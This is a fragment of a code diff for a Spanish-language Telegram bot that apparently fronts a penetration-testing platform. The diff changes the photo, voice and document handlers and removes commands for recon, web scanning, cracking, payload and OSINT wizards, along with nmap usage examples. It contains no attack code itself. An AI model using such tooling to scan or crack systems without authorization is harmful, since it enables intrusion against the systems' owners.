-        "Telegram callback rejected: reason=%s user=%s chat=%s data=%r",
-        "unroutable_callback",
-        uid,
-        chat_id,
-        query.data,
-    )
-
-
-# ─── Photo Handler ───
+    await update.message.reply_text(msg, parse_mode="Markdown")
 
 
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2159,12 +1151,9 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if rl:
         await update.message.reply_text(rl)
         return
-
     photo = update.message.photo[-1]
     file = await photo.get_file()
     file_bytes = await file.download_as_bytearray()
-    file_id = photo.file_id
-
     try:
         async with httpx.AsyncClient(timeout=30) as client:
             resp = await client.post(
@@ -2173,18 +1162,11 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 headers={"Authorization": f"Bearer {AUTH_TOKEN}"},
             )
             if resp.status_code == 200:
-                await update.message.reply_text(
-                    f"\U0001f4f8 Foto recibida.\n"
-                    f"ID: `{file_id}`\n"
-                    f"ID: `{file_id}`"
-                )
+                await update.message.reply_text(f"\U0001f4f8 Foto recibida.")
             else:
                 await update.message.reply_text(f"\u274c Error al subir: {resp.status_code}")
     except Exception as e:
         await update.message.reply_text(f"\u274c Error: {str(e)}")
-
-
-# ─── Voice Handler ───
 
 
 def _process_voice_blocking(ogg_bytes: bytes, uid: int) -> str:
@@ -2194,7 +1176,6 @@ def _process_voice_blocking(ogg_bytes: bytes, uid: int) -> str:
     ogg_path = audio_dir / f"voice_{uid}_{ts}.ogg"
     wav_path = ogg_path.with_suffix(".wav")
     ogg_path.write_bytes(ogg_bytes)
-
     wav_available = False
     try:
         subprocess.run(
@@ -2204,7 +1185,6 @@ def _process_voice_blocking(ogg_bytes: bytes, uid: int) -> str:
         wav_available = True
     except (subprocess.SubprocessError, FileNotFoundError):
         wav_available = False
-
     text = ""
     if wav_available and wav_path.exists():
         try:
@@ -2216,14 +1196,12 @@ def _process_voice_blocking(ogg_bytes: bytes, uid: int) -> str:
             text = f"[Error de transcripci\u00f3n: {e}]"
     else:
         text = "[voz: ffmpeg no disponible]"
-
     try:
         ogg_path.unlink(missing_ok=True)
         if wav_available:
             wav_path.unlink(missing_ok=True)
     except Exception:
         pass
-
     return text
 
 
@@ -2235,19 +1213,12 @@ async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if rl:
         await update.message.reply_text(rl)
         return
-
     voice = update.message.voice
     file = await voice.get_file()
     ogg_bytes = await file.download_as_bytearray()
-
     text = await asyncio.to_thread(_process_voice_blocking, ogg_bytes, uid)
-
     if text and not text.startswith("["):
-        await _safe_reply_text(
-            update.message,
-            f"\U0001f3a4 *Transcripci\u00f3n:*\n{text}",
-            parse_mode="Markdown",
-        )
+        await _safe_reply_text(update.message, f"\U0001f3a4 *Transcripci\u00f3n:*\n{text}", parse_mode="Markdown")
     else:
         await update.message.reply_text(text)
 
@@ -2260,101 +1231,51 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if rl:
         await update.message.reply_text(rl)
         return
-
-    await update.message.reply_text(
-        "El cracking de archivos no esta disponible. Usa el flujo Hash."
-    )
+    await update.message.reply_text("El cracking de archivos no est\u00e1 disponible. Usa el flujo Hash.")
 
 
-async def _open_wizard_command(update, starter):
-    uid = update.effective_user.id
-    if not _check_role(uid):
-        await update.message.reply_text("No autorizado")
-        return
-    rate_limit_error = _rate_limit_msg(uid)
-    if rate_limit_error:
-        await update.message.reply_text(rate_limit_error)
-        return
-    user_wizards.pop(uid, None)
-    await starter(update, uid)
-
-
-async def recon_command(update, context):
-    await _open_wizard_command(update, _start_recon_wizard)
-
-
-async def web_command(update, context):
-    await _open_wizard_command(update, _start_web_wizard)
-
-
-async def crack_command(update, context):
-    await _open_wizard_command(update, _start_crack_wizard)
-
-
-async def payload_command(update, context):
-    await _open_wizard_command(update, _start_payload_wizard)
-
-
-async def osint_command(update, context):
-    await _open_wizard_command(update, _start_osint_wizard)
-
-
-# ─── Ayuda ───
-
-
-async def ayuda(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not _check_role(uid):
-        await update.message.reply_text("\u274c No autorizado")
-        return
-    msg = (
-        "*Comandos:*\n"
-        "`/objetivo <target>` \u2014 Establecer target global\n"
-        "`/nmap [tipo] [target]` \u2014 Escanear con Nmap\n"
-        "`/tarea <id>` \u2014 Ver estado de tarea\n"
-        "`/tareas` \u2014 Listar tareas\n"
-        "`/ayuda` \u2014 Esta ayuda\n\n"
-        "*Tipos de escaneo:* `quick`, `normal` (default), `full`, `vuln`\n\n"
-        "*Ejemplos:*\n"
-        "`/objetivo scanme.nmap.org`\n"
-        "`/nmap` \u2014 escanea objetivo guardado\n"
-        "`/nmap full` \u2014 escanea objetivo con full\n"
-        "`/nmap quick 8.8.8.8` \u2014 escanea otra IP"
-    )
-    await update.message.reply_text(msg, parse_mode="Markdown")
+async def _chat_api(update, text):
+    try:
+        async with httpx.AsyncClient(timeout=120) as client:
+            resp = await client.post(
+                f"{API_URL}/chat",
+                json={"message": text},
+                headers={"Authorization": f"Bearer {AUTH_TOKEN}"},
+            )
+            if resp.status_code == 200:
+                try:
+                    data = resp.json()
+                    if not isinstance(data, dict):
+                        raise ValueError("response JSON is not an object")
+                except ValueError:
+                    msg = "\u274c Respuesta inv\u00e1lida de la API."
+                else:
+                    msg = data.get("response", "Sin respuesta")
+            else:
+                msg = f"\u274c Error de API: {resp.status_code}"
+    except httpx.HTTPError as exc:
+        msg = f"\u274c Error de conexi\u00f3n: {str(exc)}"
+    await _safe_reply_text(update.message, msg)
 
 
 # ─── Main ───
 
-
 def main():
-    """Función principal corregida para arrancar el bot de forma nativa sin congelar Docker"""
-    import os
     token = os.getenv("TELEGRAM_TOKEN")
-    
     if not token:
-        log.error("No se encontró la variable TELEGRAM_TOKEN")
+        log.error("No se encontr\u00f3 la variable TELEGRAM_TOKEN")
         return
 
-    # Construir la aplicación nativa de python-telegram-bot
     application = Application.builder().token(token).build()
 
-    # Registrar tus manejadores de comandos tradicionales
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("objetivo", objetivo))
     application.add_handler(CommandHandler("olvidar_objetivo", olvidar_objetivo))
     application.add_handler(CommandHandler("tarea", tarea))
     application.add_handler(CommandHandler("tareas", tareas))
-    application.add_handler(CommandHandler("nmap", nmap_shortcut))
-    application.add_handler(CommandHandler("recon", recon_command))
-    application.add_handler(CommandHandler(["webscan", "web"], web_command))
-    application.add_handler(CommandHandler("crack", crack_command))
-    application.add_handler(CommandHandler("payload", payload_command))
-    application.add_handler(CommandHandler("osint", osint_command))
     application.add_handler(CommandHandler("ayuda", ayuda))
     application.add_handler(CommandHandler("help", ayuda))
 
-    # Manejador global de texto e interacción de menús
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(MessageHandler(filters.VOICE, handle_voice))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
@@ -2362,10 +1283,9 @@ def main():
     application.add_handler(CallbackQueryHandler(handle_callback))
 
     print("[OK] Bot de Artenisa sincronizado y escuchando en Telegram...")
-    log.info("Bot de Telegram iniciado con éxito.")
-    
-    # Arrancar el polling de forma síncrona pura (rompe el congelamiento del contenedor)
+    log.info("Bot de Telegram iniciado con \u00e9xito.")
     application.run_polling()
+
 
 if __name__ == "__main__":
     main()
